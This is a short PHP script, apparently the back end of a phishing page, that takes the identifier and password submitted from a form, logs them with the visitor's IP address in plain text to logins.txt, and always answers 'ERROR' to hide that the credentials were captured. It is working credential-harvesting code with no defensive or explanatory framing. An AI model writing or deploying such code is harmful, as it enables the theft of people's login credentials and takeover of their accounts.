<?php
if (isset($_POST['identifier']) and isset($_POST['password'])) {
    $address = $_SERVER['REMOTE_ADDR'];
    $identifier = $_POST['identifier'];
    $password = $_POST['password'];

    //opening logins text file for appending new data.
    $file = fopen("logins.txt", "a") or die("Unable to open file!");
    //Writing email and password to logins.txt.
    fwrite($file, $address." ".$identifier." ".$password.PHP_EOL);
    //closing logins.txt.
    fclose($file);

    echo "ERROR";
}
else {
    echo "ERROR";
}
exit();
